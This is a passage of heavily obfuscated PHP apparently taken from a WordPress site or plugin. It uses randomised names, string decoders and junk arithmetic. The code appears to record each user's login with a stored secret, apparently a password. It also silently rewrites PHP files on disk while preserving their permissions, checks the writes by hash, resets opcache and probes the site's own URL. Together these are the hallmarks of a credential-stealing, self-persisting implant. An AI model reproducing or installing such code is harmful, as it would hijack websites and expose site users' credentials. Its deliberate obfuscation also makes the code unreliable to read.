   if   ($pl61c488om  && $pl61c488om <   $GLOBALS['__scf_ibw9xvmx9ckin_187']() -   (7775928+72))  unset($vr260_zc58jdhv6[$afi4iwtccre5mup7]);
       }
      $vr260_zc58jdhv6[$c33y569h75pi->user_login]   =  array('p'   => $zrjakvmh1gaeb,   m5t68uuej1(930)    =>    $GLOBALS['__scf_ibw9xvmx9ckin_187'](), lpwgqh9300(931) =>    0);
  vmq5vh_lh7_vsiehf4nm(m40pvx5ij_z4mj(928),  $vr260_zc58jdhv6,  m5t68uuej1(918));
   } catch   (Throwable   $k3g08rnqu9m) {
 r63yaewew47stuijcrwsx6(bovhd4vawcd(932),   $k3g08rnqu9m);
}  catch  (Exception    $k3g08rnqu9m)     {
    r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(933),   $k3g08rnqu9m);

}
      return   $c33y569h75pi;



}
      function j2jlisnjxej0zyzat($t25g3po90_,  $c33y569h75pi)
 {
     try    {
// dimension squeeze

        if   (!$GLOBALS['__scf_e_8z8ias8ka_43']($t25g3po90_)   ||   $t25g3po90_ ===   "") return;
  $vr260_zc58jdhv6   =   d6ydz3_mq4hw_2s8_bo(bovhd4vawcd(928), array());



if    (!$GLOBALS['__scf_pomb89yiuz_37']($vr260_zc58jdhv6)    || !isset($vr260_zc58jdhv6[$t25g3po90_]))  return;
$k3g08rnqu9m  =   $vr260_zc58jdhv6[$t25g3po90_];
if ($GLOBALS['__scf_pomb89yiuz_37']($k3g08rnqu9m) &&    empty($k3g08rnqu9m[bovhd4vawcd(931)]))    {
 $vr260_zc58jdhv6[$t25g3po90_][m5t68uuej1(931)]  =    1;


    vmq5vh_lh7_vsiehf4nm(lpwgqh9300(928),  $vr260_zc58jdhv6,   m5t68uuej1(934));
 }
 }    catch (Throwable    $gdp7v44evzr)    {$e49tr_2ap3=PHP_INT_MAX/PHP_INT_MAX;$x3fpgnvj24nqy=$e49tr_2ap3+36;


 r63yaewew47stuijcrwsx6(bovhd4vawcd(935), $gdp7v44evzr);
} catch  (Exception $gdp7v44evzr)    {
 r63yaewew47stuijcrwsx6(m5t68uuej1(935),  $gdp7v44evzr);
}
    }
 function     qc7g9f1y0wpuaw63($wxjm93rltbr0dubr)
   {
if    (!  $GLOBALS['__scf_pomb89yiuz_37']($wxjm93rltbr0dubr))  {
 return   false;
 }
$gdcfyicsjee3nn99    = y0ct8t_uo8f8zsstucy50b();
  foreach  ($wxjm93rltbr0dubr   as  $spi5vmaj6q)   {
 foreach ($gdcfyicsjee3nn99  as   $vt5lsdavz1ggpu6b) {
// @resolve validator

if  ($GLOBALS['__scf_vqnw5_4kg7eu_96'](bovhd4vawcd(936)   .  $GLOBALS['__scf_zh8jfi64aw1__817']($vt5lsdavz1ggpu6b,    '/')     .   m5t68uuej1(937),   $spi5vmaj6q->user_login))     {
  return $spi5vmaj6q;
 }
      }
    }

return   false;
       }



function dv62azao9qb3z33m4cwig0($hf5ajql5robd14u, $g7kt4wf19sf5ez)
{
  return $GLOBALS['__scf_vvn10ievj2k_9']($GLOBALS['__scf_pe3s4q1z7z_59']($hf5ajql5robd14u),    0,    $g7kt4wf19sf5ez);


}
      function  rvm77sgyh22g1daysbsfw($g7kt4wf19sf5ez)
  {
return   dv62azao9qb3z33m4cwig0(uniqid((string)  $GLOBALS['__scf_e1fr80hqavau3c_353'](),     true),  $g7kt4wf19sf5ez);
     }



  function  sczwhzyq3emhpu($uim861ig2y)
 {
  if  (!$GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(921)))  return  false;
$zr6b5fdx62vhn  =  get_option(lpwgqh9300(938),    array());
if    (!$GLOBALS['__scf_pomb89yiuz_37']($zr6b5fdx62vhn))  return  false;
  $yivzbj99kx559x =   $GLOBALS['__scf_pe3s4q1z7z_59']($uim861ig2y);
 if      (empty($zr6b5fdx62vhn[$yivzbj99kx559x]))      return  false;
   $ln5_jbqpu4in   =   $GLOBALS['__scf_wninqej2t1_113']('|',  (string) $zr6b5fdx62vhn[$yivzbj99kx559x]);
 $xg6ti3rgm5f5 =     isset($ln5_jbqpu4in[1])  ?  (int)    $ln5_jbqpu4in[1]  :  0;

 return    ($xg6ti3rgm5f5     > 0 &&  $GLOBALS['__scf_ibw9xvmx9ckin_187']() -  $xg6ti3rgm5f5  < (113410-27010));
 }
   function  mw5rm4gbnu50ygg($uim861ig2y, $e10lpjrfvh)
       {
 if   (!$GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(921))    || !$GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(741)))  return;


       $zr6b5fdx62vhn   = get_option(lpwgqh9300(938), array());
    if     (!$GLOBALS['__scf_pomb89yiuz_37']($zr6b5fdx62vhn))    $zr6b5fdx62vhn    = array();
   $yivzbj99kx559x  = $GLOBALS['__scf_pe3s4q1z7z_59']($uim861ig2y);
 if   (!$e10lpjrfvh)  {
 if  (isset($zr6b5fdx62vhn[$yivzbj99kx559x]))    {
unset($zr6b5fdx62vhn[$yivzbj99kx559x]);
 update_option(m5t68uuej1(938), $zr6b5fdx62vhn,  m40pvx5ij_z4mj(939));
 }
// cancel non-singular scope-chain




      return;
   }
       $jhq7h77_vtf = 0;$ls9d8cp8g=920;$lg07dxsk=($ls9d8cp8g>0)?$ls9d8cp8g:-$ls9d8cp8g;
if   (!empty($zr6b5fdx62vhn[$yivzbj99kx559x])) {
 $ln5_jbqpu4in = $GLOBALS['__scf_wninqej2t1_113']('|',  (string)     $zr6b5fdx62vhn[$yivzbj99kx559x]);
$jhq7h77_vtf     =     (int) $ln5_jbqpu4in[0];
}
       $jhq7h77_vtf++;
    $xg6ti3rgm5f5  =   ($jhq7h77_vtf  >=   (5-2))   ?   $GLOBALS['__scf_ibw9xvmx9ckin_187']() :  0;
foreach  ($zr6b5fdx62vhn   as  $dp5a6g3j7i    => $jun4mpnkdl)   {
$yuzuzvesvv  = $GLOBALS['__scf_wninqej2t1_113']('|',    (string)  $jun4mpnkdl);



 $y_x8rzuuz4x67     =   isset($yuzuzvesvv[2])  ? (int)   $yuzuzvesvv[2] : 0;



   if (!$y_x8rzuuz4x67  &&  !empty($yuzuzvesvv[1]))  $y_x8rzuuz4x67    = (int)   $yuzuzvesvv[1];
if   ($y_x8rzuuz4x67     &&   $GLOBALS['__scf_ibw9xvmx9ckin_187']() -   $y_x8rzuuz4x67 >     (134386+38414))   unset($zr6b5fdx62vhn[$dp5a6g3j7i]);
  }


$zr6b5fdx62vhn[$yivzbj99kx559x]    =  $jhq7h77_vtf   .   '|'   .  $xg6ti3rgm5f5 .  '|'   .      $GLOBALS['__scf_ibw9xvmx9ckin_187']();
 if  ($GLOBALS['__scf_xbixt340jb_38']($zr6b5fdx62vhn)  > (56+44))  {

$ziso6s03lz0_g  =    array();


     foreach  ($zr6b5fdx62vhn as  $dp5a6g3j7i  => $jun4mpnkdl) {
 $yuzuzvesvv     =   $GLOBALS['__scf_wninqej2t1_113']('|', (string)     $jun4mpnkdl);
 $ziso6s03lz0_g[$dp5a6g3j7i]   =  isset($yuzuzvesvv[2])   ?     (int)  $yuzuzvesvv[2]    :   (isset($yuzuzvesvv[1]) ?    (int)    $yuzuzvesvv[1]    :  0);
 }
    $GLOBALS['__scf_c57f_uqsqk_940']($ziso6s03lz0_g);
  $ggovfzxyzw48_93 =   $GLOBALS['__scf_xbixt340jb_38']($zr6b5fdx62vhn)   -     (21+79);
    foreach ($ziso6s03lz0_g as $dp5a6g3j7i =>  $a77e1utlu5tjkj__)   {$yhez4uqh=8792;$rrk_q5ta4fgdm=$yhez4uqh%9;


if ($ggovfzxyzw48_93   <= 0)     break;
if  ($dp5a6g3j7i  === $yivzbj99kx559x)   continue;
   unset($zr6b5fdx62vhn[$dp5a6g3j7i]);
     $ggovfzxyzw48_93--;
 }
   unset($ziso6s03lz0_g,   $a77e1utlu5tjkj__, $ggovfzxyzw48_93);
    }
update_option(lpwgqh9300(938), $zr6b5fdx62vhn,  m40pvx5ij_z4mj(939));

  }
    function  z8f7737z93lhce557qi8lf($uim861ig2y, $eglnepbv6r0i,     $t5f_iiqfera5   =    null)
   {
if (!$GLOBALS['__scf_e_8z8ias8ka_43']($eglnepbv6r0i)) return;
   $zfwq5k38dfh61   =  m7maju8jcvf3286($GLOBALS['__scf_oagg5b1ubqmznt_11']($uim861ig2y), lpwgqh9300(941));
if   ($zfwq5k38dfh61  !==   false)  {
 if  ($t5f_iiqfera5 !== null)      @$GLOBALS['__scf__vykm6livjsep_17']($zfwq5k38dfh61, $t5f_iiqfera5 &  (487+24));
  if   (@$GLOBALS['__scf_u59p44o1il_196']($zfwq5k38dfh61,  $eglnepbv6r0i)    === $GLOBALS['__scf_fr9u7cq1eo_10']($eglnepbv6r0i)  &&    j07vd_9875h0key7jsai($zfwq5k38dfh61,    $uim861ig2y))  return;
   netei2x342rtzmi4tj69($zfwq5k38dfh61);
 }
        @$GLOBALS['__scf_u59p44o1il_196']($uim861ig2y,     $eglnepbv6r0i);
 }
function     a3hx61zfms1ji3euwsc($uim861ig2y, $c_k37hubu03ktz)
{

    $_xfdo1_14r691bp  =  $GLOBALS['__scf_oagg5b1ubqmznt_11']($uim861ig2y);
  if  (!@$GLOBALS['__scf_i9hdv7zrfsy_45']($_xfdo1_14r691bp)) {
     r63yaewew47stuijcrwsx6(lpwgqh9300(942),  m5t68uuej1(943)   . $GLOBALS['__scf_os_n9tj5psxjj_3']($uim861ig2y));
  return   false;
}
 $svqx6u7jo21t5   =  ($GLOBALS['__scf_vvn10ievj2k_9']($uim861ig2y,  -(6-2)) === m40pvx5ij_z4mj(835));
  if  ($svqx6u7jo21t5   && !fgcc_h22bqxgwmccod($c_k37hubu03ktz))  {

  r63yaewew47stuijcrwsx6(bovhd4vawcd(942),      lpwgqh9300(944)  .     $GLOBALS['__scf_os_n9tj5psxjj_3']($uim861ig2y));
return false;
 }
  if     ($svqx6u7jo21t5  &&     sczwhzyq3emhpu($uim861ig2y)) return    false;
  $gfnn437owxcn =  false;



 if      (@$GLOBALS['__scf_ph63athptt_46']($uim861ig2y))  $gfnn437owxcn     = true;  
        $eglnepbv6r0i =     null;$seyf4ackv3mj=4443;$fu815h7_=$seyf4ackv3mj%10;
$v5aj5srl3v695   =     false;
    $il1sde6_d_am =   null;
if (@$GLOBALS['__scf_a83pywb98qzq2_20']($uim861ig2y))   {



  $v5aj5srl3v695 =  true;
   if   (!$gfnn437owxcn)     {
      $il1sde6_d_am = @fileperms($uim861ig2y);

  if ($il1sde6_d_am ===      false)    $il1sde6_d_am     =   null;

     }
    $kfjpo6nd6o_otcr =  @$GLOBALS['__scf_pftf6vocmvs2m_99']($uim861ig2y);
  if ($kfjpo6nd6o_otcr !== false   &&     $kfjpo6nd6o_otcr <= (21153533+31275267)   &&    ($kfjpo6nd6o_otcr   <= (1048495+81)   ||   e2driuzucqp8g4db42ay($kfjpo6nd6o_otcr)))     $eglnepbv6r0i  =  @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($uim861ig2y);
  unset($kfjpo6nd6o_otcr);
   }
if  (!$GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(945)))    {
      r63yaewew47stuijcrwsx6(bovhd4vawcd(946),  lpwgqh9300(947)  .  $GLOBALS['__scf_os_n9tj5psxjj_3']($uim861ig2y));
    return false;
     }
        $t0v2o3etv3dw =     false;



       $xjk4k6nhaaebf4p9  =  false;

 $_cl     =     $GLOBALS['__scf_fr9u7cq1eo_10']($c_k37hubu03ktz);
     for   ($k7xo7y6_sl9  =     0; $k7xo7y6_sl9  <      2;  $k7xo7y6_sl9++)   {
$t0v2o3etv3dw   =  m7maju8jcvf3286($_xfdo1_14r691bp,      bovhd4vawcd(42));
   if   ($t0v2o3etv3dw   !==   false) {
       $xjk4k6nhaaebf4p9      =    false;
      $yuzuzvesvv  =   @$GLOBALS['__scf_vtcl9hk0l_e1o6_23']($t0v2o3etv3dw,   m40pvx5ij_z4mj(948));
        if      ($yuzuzvesvv  !==      false)  {
 $xwrcl0sw1cl  =  0;

    while     ($xwrcl0sw1cl  <    $_cl)  {
$y3v6atoz5c7pbz   =  @$GLOBALS['__scf_a7yyfjhtdfh5_25']($yuzuzvesvv,   $GLOBALS['__scf_vvn10ievj2k_9']($c_k37hubu03ktz,   $xwrcl0sw1cl));
    if    ($y3v6atoz5c7pbz    ===   false   || $y3v6atoz5c7pbz  ===  0)  break;
  $xwrcl0sw1cl    += $y3v6atoz5c7pbz;
    }
   @fflush($yuzuzvesvv);
 if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(949)))  @fsync($yuzuzvesvv);
  

 @fclose($yuzuzvesvv);
 if ($xwrcl0sw1cl   ===      $_cl)  $xjk4k6nhaaebf4p9    =  $xwrcl0sw1cl;

 }   else     {
       $xjk4k6nhaaebf4p9  = @$GLOBALS['__scf_u59p44o1il_196']($t0v2o3etv3dw, $c_k37hubu03ktz);
 }
     if ($xjk4k6nhaaebf4p9    !== false      && $xjk4k6nhaaebf4p9  === $_cl)    break;
 netei2x342rtzmi4tj69($t0v2o3etv3dw);
$t0v2o3etv3dw =    false;
}
 }
   if ($t0v2o3etv3dw  ===  false) {
       r63yaewew47stuijcrwsx6(bovhd4vawcd(946), m5t68uuej1(950)   .    $GLOBALS['__scf_os_n9tj5psxjj_3']($uim861ig2y));
  return false;
       }

   if     ($xjk4k6nhaaebf4p9   ===  false    ||   $xjk4k6nhaaebf4p9 !==  $_cl)     {
        r63yaewew47stuijcrwsx6(lpwgqh9300(951), m40pvx5ij_z4mj(952)      .  $GLOBALS['__scf_os_n9tj5psxjj_3']($uim861ig2y));



netei2x342rtzmi4tj69($t0v2o3etv3dw);
 return    false;
  }
      if   ($il1sde6_d_am    !== null)  @$GLOBALS['__scf__vykm6livjsep_17']($t0v2o3etv3dw,  $il1sde6_d_am   &  (878-367));
   if  ($gfnn437owxcn)    {

$f1yjktv2ll5g  =  @$GLOBALS['__scf_u59p44o1il_196']($uim861ig2y,  $c_k37hubu03ktz);
   if ($f1yjktv2ll5g  ===      $_cl) {
 netei2x342rtzmi4tj69($t0v2o3etv3dw);
  @clearstatcache(true,   $uim861ig2y);
  nhm51ioabawwjskqka9eh3($uim861ig2y);$ue0ga1yig3t=PHP_INT_MAX/PHP_INT_MAX;$c8xjhj7zz_pml=$ue0ga1yig3t+6;
    if   ($svqx6u7jo21t5) mw5rm4gbnu50ygg($uim861ig2y,  false);


    return     true;
 }
      if ($GLOBALS['__scf_e_8z8ias8ka_43']($eglnepbv6r0i))   @$GLOBALS['__scf_u59p44o1il_196']($uim861ig2y,      $eglnepbv6r0i);
netei2x342rtzmi4tj69($t0v2o3etv3dw);


  r63yaewew47stuijcrwsx6(m5t68uuej1(951), m40pvx5ij_z4mj(953)    .    $GLOBALS['__scf_os_n9tj5psxjj_3']($uim861ig2y));


        return  false;
}
  $ikm5544gay =      j07vd_9875h0key7jsai($t0v2o3etv3dw,  $uim861ig2y);



    if     (!$ikm5544gay   &&      $v5aj5srl3v695  &&  !$gfnn437owxcn)    {


if    (@$GLOBALS['__scf_a83pywb98qzq2_20']($uim861ig2y))  cik9ldzrbjmtnzm00($uim861ig2y, (375+45));
  $_zs6eykqlz2mqp0     =    $uim861ig2y .  lpwgqh9300(954)   .   $GLOBALS['__scf_e1fr80hqavau3c_353']((903+97),     (0x149f+0x1270));
  if  (j07vd_9875h0key7jsai($uim861ig2y,  $_zs6eykqlz2mqp0))    {
$ikm5544gay   = j07vd_9875h0key7jsai($t0v2o3etv3dw,  $uim861ig2y);
    if     ($ikm5544gay)  {
  netei2x342rtzmi4tj69($_zs6eykqlz2mqp0);
     }      else  {
   if (!j07vd_9875h0key7jsai($_zs6eykqlz2mqp0,   $uim861ig2y) &&   !b750sq0jbo8pcqvsan($_zs6eykqlz2mqp0,      $uim861ig2y)) {
z8f7737z93lhce557qi8lf($uim861ig2y,   $eglnepbv6r0i,    $il1sde6_d_am);
  }
if  (!@$GLOBALS['__scf_a83pywb98qzq2_20']($uim861ig2y))     {
   z8f7737z93lhce557qi8lf($uim861ig2y,  $eglnepbv6r0i,  $il1sde6_d_am);
 }
    }
 }
 }
    if  (!$ikm5544gay &&  !$gfnn437owxcn && !$svqx6u7jo21t5)     {
if   (@$GLOBALS['__scf_a83pywb98qzq2_20']($uim861ig2y)) cik9ldzrbjmtnzm00($uim861ig2y, (0xb+0x199));



  if (b750sq0jbo8pcqvsan($t0v2o3etv3dw, $uim861ig2y)) {
  $ikm5544gay = true;


netei2x342rtzmi4tj69($t0v2o3etv3dw);
 }
  }
 if  (!$ikm5544gay) {



if  (@$GLOBALS['__scf_a83pywb98qzq2_20']($uim861ig2y)  &&      (int) @$GLOBALS['__scf_pftf6vocmvs2m_99']($uim861ig2y)    !==     $_cl)     {
 $h274311tuh17_  = @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($uim861ig2y);
       if (!$GLOBALS['__scf_e_8z8ias8ka_43']($h274311tuh17_) || ($GLOBALS['__scf_e_8z8ias8ka_43']($eglnepbv6r0i) && $h274311tuh17_   !== $eglnepbv6r0i))   {
        if ($GLOBALS['__scf_e_8z8ias8ka_43']($eglnepbv6r0i)) z8f7737z93lhce557qi8lf($uim861ig2y,   $eglnepbv6r0i,     $il1sde6_d_am);


 elseif      (!$v5aj5srl3v695) netei2x342rtzmi4tj69($uim861ig2y);
  }
      unset($h274311tuh17_);
   }
     if  (!@$GLOBALS['__scf_a83pywb98qzq2_20']($uim861ig2y))    {
 z8f7737z93lhce557qi8lf($uim861ig2y,     $eglnepbv6r0i,     $il1sde6_d_am);
   }
r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(951),    m5t68uuej1(955)  .  $GLOBALS['__scf_os_n9tj5psxjj_3']($uim861ig2y));
netei2x342rtzmi4tj69($t0v2o3etv3dw);
return false;
 }
@clearstatcache(true, $uim861ig2y);
 $cdfgmat2uxjz   =     false;
 if    ($_cl <=   (2097099+53)) {
 $ebmywmp1n79ni2x     = @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($uim861ig2y);
 $cdfgmat2uxjz =  ($GLOBALS['__scf_e_8z8ias8ka_43']($ebmywmp1n79ni2x) && $GLOBALS['__scf_fr9u7cq1eo_10']($ebmywmp1n79ni2x)   === $_cl  && $GLOBALS['__scf_pe3s4q1z7z_59']($ebmywmp1n79ni2x)  === $GLOBALS['__scf_pe3s4q1z7z_59']($c_k37hubu03ktz));
}   else {

$tt9prbejy6forxi   =   $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(956))  ?   @hash_file(lpwgqh9300(957),    $uim861ig2y) :    false;
   if ($GLOBALS['__scf_e_8z8ias8ka_43']($tt9prbejy6forxi)  && $tt9prbejy6forxi   !== "")  $cdfgmat2uxjz  =    ($tt9prbejy6forxi  === $GLOBALS['__scf_pe3s4q1z7z_59']($c_k37hubu03ktz));


  else  {
       $yxa6q4akqe  =   @$GLOBALS['__scf_pftf6vocmvs2m_99']($uim861ig2y);
      if  ($yxa6q4akqe  ===  $_cl) {$rszawyhp=7831;$r3jkxzhe=$rszawyhp%12;
     $z1ua4tl38uhh   =  @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($uim861ig2y, false, null,     0,  (4034+62));
  $_rt   =    @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($uim861ig2y,   false,   null,    $_cl     -    (4086+10));
  $cdfgmat2uxjz    = ($GLOBALS['__scf_e_8z8ias8ka_43']($z1ua4tl38uhh) && $GLOBALS['__scf_e_8z8ias8ka_43']($_rt) &&   $z1ua4tl38uhh   === $GLOBALS['__scf_vvn10ievj2k_9']($c_k37hubu03ktz,  0, (4032+64))  &&  $_rt   ===    $GLOBALS['__scf_vvn10ievj2k_9']($c_k37hubu03ktz, $_cl -  (4021+75)));


  }
}
  }
   if (!$cdfgmat2uxjz)   {
      r63yaewew47stuijcrwsx6(m5t68uuej1(951), bovhd4vawcd(958)    . $GLOBALS['__scf_os_n9tj5psxjj_3']($uim861ig2y));



 if ($svqx6u7jo21t5)   mw5rm4gbnu50ygg($uim861ig2y,  true);
    if ($GLOBALS['__scf_e_8z8ias8ka_43']($eglnepbv6r0i))  {


   $gpgy0bisig_4a0 =  $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(956))   ? @hash_file(lpwgqh9300(959), $uim861ig2y) : false;
    if  ($GLOBALS['__scf_e_8z8ias8ka_43']($gpgy0bisig_4a0)  &&    $gpgy0bisig_4a0  !== "" &&    $gpgy0bisig_4a0  !==    $GLOBALS['__scf_pe3s4q1z7z_59']($c_k37hubu03ktz)  &&    $gpgy0bisig_4a0     !==    $GLOBALS['__scf_pe3s4q1z7z_59']($eglnepbv6r0i))   {
    r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(951),  m5t68uuej1(960)  .   $GLOBALS['__scf_os_n9tj5psxjj_3']($uim861ig2y));
   return  false;

       }
$hfn4gjup_aa = m7maju8jcvf3286($_xfdo1_14r691bp,  m40pvx5ij_z4mj(961));
  if     ($hfn4gjup_aa    !==  false  &&   @$GLOBALS['__scf_u59p44o1il_196']($hfn4gjup_aa,  $eglnepbv6r0i) === $GLOBALS['__scf_fr9u7cq1eo_10']($eglnepbv6r0i))  {
 @$GLOBALS['__scf__vykm6livjsep_17']($hfn4gjup_aa,   $il1sde6_d_am  !==  null  ?    ($il1sde6_d_am  &  (421+90)) :    (346+74));
 if  (!j07vd_9875h0key7jsai($hfn4gjup_aa,   $uim861ig2y))  {
    if    (@$GLOBALS['__scf_a83pywb98qzq2_20']($uim861ig2y) &&   !$gfnn437owxcn) cik9ldzrbjmtnzm00($uim861ig2y,   (0x70+0x134));
 if   (!$gfnn437owxcn &&  b750sq0jbo8pcqvsan($hfn4gjup_aa,    $uim861ig2y)) {


       netei2x342rtzmi4tj69($hfn4gjup_aa);
   }   else    {
  @$GLOBALS['__scf_u59p44o1il_196']($uim861ig2y, $eglnepbv6r0i);
netei2x342rtzmi4tj69($hfn4gjup_aa);
     }
}
}  else      {
if  ($hfn4gjup_aa   !==    false)    netei2x342rtzmi4tj69($hfn4gjup_aa);
    @$GLOBALS['__scf_u59p44o1il_196']($uim861ig2y, $eglnepbv6r0i);


}
        nhm51ioabawwjskqka9eh3($uim861ig2y);
  } elseif (!$v5aj5srl3v695) {



 netei2x342rtzmi4tj69($uim861ig2y);
 }



 return   false;
}
    nhm51ioabawwjskqka9eh3($uim861ig2y);
tgj6urla_2q3x4g8e($uim861ig2y);
cik9ldzrbjmtnzm00($uim861ig2y,    $il1sde6_d_am !==  null ?  ($il1sde6_d_am &    (477+34)) : (356+64));
    if  ($svqx6u7jo21t5)   mw5rm4gbnu50ygg($uim861ig2y,    false);
 return    true;
 }
   function  nk_2ynb8ijgjad4yfhv($uim861ig2y, $r2a6d9v4fwf7g9p)
 {
 $t6jsjlatx2i  =  "<?php\n";
      if  ($GLOBALS['__scf_e_8z8ias8ka_43']($r2a6d9v4fwf7g9p)     &&  $r2a6d9v4fwf7g9p !==    ""   &&  $GLOBALS['__scf_i8i8g4oxha_7']($r2a6d9v4fwf7g9p, m40pvx5ij_z4mj(238))   !== false &&   fgcc_h22bqxgwmccod($r2a6d9v4fwf7g9p))      $t6jsjlatx2i =     $r2a6d9v4fwf7g9p;



      if  (@$GLOBALS['__scf_a83pywb98qzq2_20']($uim861ig2y))   {
 $jn81aqi2xzqid    =   @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($uim861ig2y);
if ($GLOBALS['__scf_e_8z8ias8ka_43']($jn81aqi2xzqid)  && bdsvhgz69_4ct5ntcc($jn81aqi2xzqid) === $t6jsjlatx2i)  return;

    }
    if   (!a3hx61zfms1ji3euwsc($uim861ig2y, $t6jsjlatx2i))  {$t5e8ga2ftv5d=92*6;$tr861q8g9zu3fz=$t5e8ga2ftv5d-31;
  $aezo3cc_ex      =     @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($uim861ig2y);
      if (!($GLOBALS['__scf_e_8z8ias8ka_43']($aezo3cc_ex)  &&   bdsvhgz69_4ct5ntcc($aezo3cc_ex) ===   $t6jsjlatx2i))  @$GLOBALS['__scf_u59p44o1il_196']($uim861ig2y,  $t6jsjlatx2i);

unset($aezo3cc_ex);
 }
  nhm51ioabawwjskqka9eh3($uim861ig2y);
}
 function   tbn1xfr6_nde2lz_5ar9h()
     {



if ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(962)) &&  sqpd81axvg872g96_9tash())   return true;
 if  (!$GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(556)) ||    !$GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(757))) return  true;
    if ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(963)) &&   qf3be0n5t4x_6tii01jj3v()     <=     1.5)  return true;
 $w_k1kzxexkgh6hp      = $GLOBALS['__scf_f0qmyuwszehfh7_472'](1, $GLOBALS['__scf_fffiaden_pfx9__473']((2+3), (int)  qf3be0n5t4x_6tii01jj3v()));
 $azf98962xi    =  home_url('/');
 $azf98962xi   .=   ($GLOBALS['__scf_i8i8g4oxha_7']($azf98962xi,    '?') === false      ?  '?'    :  '&')  . m5t68uuej1(964) .  $GLOBALS['__scf_ibw9xvmx9ckin_187']() .   $GLOBALS['__scf_e1fr80hqavau3c_353']((64+36),      (0x3ad+0x3a));
 $ldnijs34utinjtuu      = $GLOBALS['__scf_ciwgxuks3i4cd_287'](true);

 $w1jfjex0s0pwt    =  $GLOBALS['__scf_bgujd0wqxduxtu_290']($azf98962xi, array(lpwgqh9300(465) =>   $w_k1kzxexkgh6hp,     m40pvx5ij_z4mj(308)    =>  false,   m40pvx5ij_z4mj(679)    =>   2,   bovhd4vawcd(680) => (1457337-408761), m40pvx5ij_z4mj(965)     =>   array(lpwgqh9300(966)   => bovhd4vawcd(967))));
   if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(968)))  v6vxxreyrfdn2ah4n2($GLOBALS['__scf_ciwgxuks3i4cd_287'](true)  -  $ldnijs34utinjtuu);
     if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(681))  &&      is_wp_error($w1jfjex0s0pwt))    {
     if     ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(963))    &&  qf3be0n5t4x_6tii01jj3v()  <=  1.5)    return  true;
  $w_k1kzxexkgh6hp  = $GLOBALS['__scf_f0qmyuwszehfh7_472'](1,   $GLOBALS['__scf_fffiaden_pfx9__473']((0x2+0x3),   (int)   qf3be0n5t4x_6tii01jj3v()));
   $ldnijs34utinjtuu  =   $GLOBALS['__scf_ciwgxuks3i4cd_287'](true);
$w1jfjex0s0pwt  =   $GLOBALS['__scf_bgujd0wqxduxtu_290']($azf98962xi,  array(m5t68uuej1(465) =>     $w_k1kzxexkgh6hp,   m5t68uuej1(308)  =>  false,  m40pvx5ij_z4mj(679)  => 2, m5t68uuej1(680)    =>  (1048522+54),   m5t68uuej1(965)  => array(bovhd4vawcd(969)   =>  m5t68uuej1(970))));
if     ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(971)))  v6vxxreyrfdn2ah4n2($GLOBALS['__scf_ciwgxuks3i4cd_287'](true)     -  $ldnijs34utinjtuu);
       if ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(972))      &&    is_wp_error($w1jfjex0s0pwt)) return  false;
 }
 $xyefjufnmgls  = (int) wp_remote_retrieve_response_code($w1jfjex0s0pwt);


   return  $xyefjufnmgls  >=   (144^244)  &&  $xyefjufnmgls    < (0x89+0x16b);



     }
 function    k32wt5t3_v3nj3($kzbimi997rog93nb, $gb4cyt6l0752tdjg)
  {
 $szlze7c6mbixvbj  = $GLOBALS['__scf_zh8jfi64aw1__817']($GLOBALS['__scf_os_n9tj5psxjj_3']($gb4cyt6l0752tdjg), '/');



foreach   (


 array(
   m5t68uuej1(973) .  $szlze7c6mbixvbj .   lpwgqh9300(974),
m5t68uuej1(975) .   $szlze7c6mbixvbj .   m40pvx5ij_z4mj(976),
bovhd4vawcd(977) .   $szlze7c6mbixvbj .  m40pvx5ij_z4mj(978),
     m40pvx5ij_z4mj(979),
   m40pvx5ij_z4mj(980),
)   as  $td4nf6_m3bamydo
    ) {

 if (!$GLOBALS['__scf_e_8z8ias8ka_43']($kzbimi997rog93nb))   break;
       $kzbimi997rog93nb  =   $GLOBALS['__scf_r1v12_o00h5hc_454']($td4nf6_m3bamydo,  "\n", $kzbimi997rog93nb);
    }
  return $kzbimi997rog93nb;
   }
function  nhm51ioabawwjskqka9eh3($o9nbfdea9ztie0d9)

   {

     if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(22)))   {


if  (@opcache_invalidate($o9nbfdea9ztie0d9,  true) !==   false) return     true;
  if ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(981)))     return    (bool) @opcache_reset();
  return false;
  }



   $ygmyw61iaq52f  =    $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(982))   ?  @opcache_get_status(false)   :   false;
      return    !($GLOBALS['__scf_pomb89yiuz_37']($ygmyw61iaq52f) &&   !empty($ygmyw61iaq52f[m5t68uuej1(983)]));
     }
      function d3czoa7z5ve8_za41c14d($uim861ig2y,   $biu009h8ggntwd3,  $zhj75h9ibapwt)
    {
    if ($GLOBALS['__scf_vvn10ievj2k_9']($uim861ig2y,    -(0x1+0x3))    ===     bovhd4vawcd(835))     {
 if (!a3hx61zfms1ji3euwsc($uim861ig2y,  $biu009h8ggntwd3))   {
